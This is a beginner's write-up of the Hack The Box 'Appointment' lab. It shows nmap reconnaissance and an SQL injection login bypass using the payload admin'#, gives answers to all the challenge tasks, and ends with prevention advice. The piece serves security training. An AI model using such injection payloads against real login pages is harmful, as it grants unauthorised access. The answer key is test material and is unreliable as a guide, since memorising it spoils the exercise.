# Hack The Box: Appointment Writeup — Very Easy

> **Difficulty:** Very Easy | **Tier:** Starting Point Tier 1 | **Tags:** SQL Injection, Web, Apache, OWASP A03:2021

Another day, another box! This time we're exploiting a classic SQL Injection vulnerability to bypass a login page without knowing the password 😄 Let's dive in 🚀

---

## What is Appointment?

Appointment is a Very Easy difficulty machine from Hack The Box Starting Point Tier 1. It focuses on SQL Injection — one of the most dangerous and common web vulnerabilities. A great box for beginners getting into web application hacking.

**Skills covered:**
- Network reconnaissance with Nmap
- SQL Injection login bypass

---

## Setting Up

Connect to the HTB network using your OpenVPN config file:

```bash
sudo openvpn your-htb-vpn-file.ovpn
```

Then spawn the Appointment machine from the HTB Starting Point page. My target IP was `10.129.102.144`.

<img width="1399" height="106" alt="Target IP" src="https://github.com/user-attachments/assets/58f81410-4269-4000-b4eb-f24f8ae8942a" />

---

## Step 1 — Ping the Target

Before doing anything, confirm the machine is reachable:

```bash
ping -c 4 10.129.102.144
```
<img width="596" height="174" alt="ping target" src="https://github.com/user-attachments/assets/c72928a3-adef-4b4f-b33b-151f4bd9533e" />

Got 4 replies back with 0% packet loss. Target is alive. ✅

---

## Step 2 — Nmap Scan

Run a service version scan to find open ports:

```bash
nmap -sVC -T4 10.129.102.144
```
<img width="791" height="203" alt="nmap scan" src="https://github.com/user-attachments/assets/ddf29da9-4485-44b0-902e-abef4a8de990" />

Only port 80 is open, running **Apache httpd 2.4.38 (Debian)**. The page title says "Login" — so there's a web login page waiting for us.

---

## Step 3 — Visit the Login Page

Open the browser and go to `http://10.129.102.144`. A login page appears asking for username and password.

The backend SQL query probably looks like this:

```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
```
<img width="540" height="703" alt="loginpage 2" src="https://github.com/user-attachments/assets/68c8f984-ce93-4647-a1b4-264779b0fa1e" />

If we inject `admin'#` as the username, the query becomes:

```sql
SELECT * FROM users WHERE username='admin'#' AND password='anything'
```

The `#` comments out the password check completely — so we log in as admin without needing the password!

---

## Step 4 — SQL Injection Login Bypass

Enter the following in the login form:

```
Username: admin'#
Password: anything
```

Click Login and we're in! ✅


---

<img width="816" height="200" alt="flag" src="https://github.com/user-attachments/assets/b734ebbd-734e-40da-8a6e-ba7a4c72ea7f" />

The first word on the returned page is **Congratulations**.

---

## Task Answers

**Task 1 — What does the acronym SQL stand for?**
`Structured Query Language`

**Task 2 — What is one of the most common types of SQL vulnerabilities?**
`SQL Injection`

**Task 3 — What is the 2021 OWASP Top 10 classification for this vulnerability?**
`A03:2021 — Injection`

SQL Injection falls under the Injection category in the OWASP Top 10:2021, ranked third position with a max incidence rate of 19%.

![owasp top 10](https://github.com/user-attachments/assets/c291c755-52ae-49e8-99a9-f7b58ed8ba75)

**Task 4 — What does Nmap report as the service running on port 80?**
`Apache httpd 2.4.38 (Debian)`

**Task 5 — What is the standard port used for HTTPS?**
`443`

**Task 6 — What is a folder called in web-application terminology?**
`Directory`

**Task 7 — What is the HTTP response code for Not Found errors?**
`404`

**Task 8 — What Gobuster switch is used to discover directories?**
`dir`

![gobuster help](https://github.com/user-attachments/assets/56107bfc-a821-436b-93ba-759822828875)

**Task 9 — What single character comments out the rest of a line in MySQL?**
`#`

**Task 10 — What is the first word on the webpage returned after login bypass?**
`Congratulations`
## What I Learned

Appointment shows how dangerous unsanitized user input can be. A single quote and a comment character was enough to completely bypass authentication. To prevent SQL Injection in real applications:

- **Use prepared statements** — never build SQL queries by concatenating user input
- **Validate all input** on the server side — never trust what comes from the client
- **Least privilege** — database accounts used by web apps should have minimum permissions

---

*Written by [Tharindu Pathmasiri](https://github.com/tharindu-L) — IT Undergraduate | Cybersecurity Enthusiast*
